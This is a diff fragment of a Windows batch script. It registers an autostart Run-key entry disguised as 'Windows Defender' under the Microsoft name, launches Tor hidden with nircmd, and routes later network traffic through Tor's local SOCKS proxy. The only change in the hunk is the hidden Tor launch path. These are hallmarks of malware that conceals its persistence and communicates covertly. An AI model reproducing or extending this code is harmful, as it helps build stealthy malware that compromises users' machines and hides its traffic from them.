@@ -24,7 +24,7 @@ start "" "%windir%\explorer.exe"
 
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%windir%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-nircmd exec hide "C:\Tor\tor.exe"
+nircmd exec hide "%systemdrive%\Tor\tor.exe"
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
   set "proxy=--tlsv1"
